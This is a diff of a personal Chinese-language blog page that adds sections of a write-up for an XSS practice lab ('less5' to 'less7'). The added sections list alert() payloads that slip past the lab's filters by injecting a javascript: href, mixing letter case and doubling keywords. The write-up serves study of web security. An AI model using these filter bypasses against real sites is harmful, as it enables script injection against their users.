@@ -118,8 +118,15 @@ ga('send', 'pageview');
 <p>输入<code>&#39;</code> <code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; &#39;=&quot;&quot;&gt;</code><br>输入<code>&#39;&#39;</code> <code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; &#39;&#39;=&quot;&quot;&gt;</code><br>输入<code>&#39;onclick&#39;</code> <code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; onclick&#39;&#39;=&quot;&quot;&gt;</code><br>输入<code>onclick=</code> <code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; onclick=&quot;&quot;&gt;</code></p>
 <hr>
 <h2 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h2><p>输入<code>&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot;</code><br>查看可知<code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; scriptalert()=&quot;&quot; script&quot;&quot;=&quot;&quot;&gt;</code>过滤了<code>&lt;</code> <code>&gt;</code><br>利用上节方法<br><code>&quot;onclick=&quot;alert()</code></p>
-<hr>
 <p>更新于2019-03-03 11:19:50 星期日</p>
+<hr>
+<h2 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h2><p>试过后发现<code>onclick</code>变为<code>o_nclick</code><br><code>script</code>变为<code>sc_ript</code><br>使用<code>&quot;&gt;&lt;a href=&quot;javascript:alert()&quot;&gt;</code></p>
+<hr>
+<h2 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h2><p><code>onclick script href</code>输入后都进行了变化<br><code>&quot;&gt;&lt;a HRef=&quot;javascript:alert()&quot;&gt;</code><br><code>keyword=&quot;ONclick=&quot;alert()</code><br><code>keyword=&quot;&gt;&lt;scriPt&gt;alert()&lt;/SCRIpt&gt;&lt;&quot;</code><br><code>keyword=&quot;&gt;&lt;a HreF=javascript:alert()&gt;213&lt;/a&gt;&quot;&lt;</code><br>进行大小写替换可以</p>
+<hr>
+<h2 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h2><p><code>script</code>被过滤，改变大小写也没有用<br><code>on</code>被过滤<br><code>href</code>同样如此<br><code>keyword=&quot;&gt;&lt;scriscriptpt&gt;alert()&lt;/scrscriptipt&gt;&lt;&quot;</code><br>利用双写绕过</p>
+<p>更新于2019-03-06 21:20:39 星期三</p>
+<hr>
 
       
     </div>
@@ -127,7 +134,7 @@ ga('send', 'pageview');
     <span id="busuanzi_container_page_pv">
   本文总阅读量<span id="busuanzi_value_page_pv"></span>次
 	</span>
-      <a data-url="http://finsenty54.github.io/2019/03/02/xss/" data-id="cjsx6jnqg0001c8w8c07pvvrv" class="article-share-link">Share</a>
+      <a data-url="http://finsenty54.github.io/2019/03/02/xss/" data-id="cjsx8daxt0001hww8ygy6hefx" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/">xss</a></li></ul>
@@ -267,7 +274,7 @@ POST - 向指定的资源提交要被处理的数据
     <span id="busuanzi_container_page_pv">
   本文总阅读量<span id="busuanzi_value_page_pv"></span>次
 	</span>
-      <a data-url="http://finsenty54.github.io/2019/02/27/sqli-labs/" data-id="cjsx6jnqy0004c8w872aqduob" class="article-share-link">Share</a>
+      <a data-url="http://finsenty54.github.io/2019/02/27/sqli-labs/" data-id="cjsx8dayb0004hww882yrub2o" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql/">sql</a></li></ul>
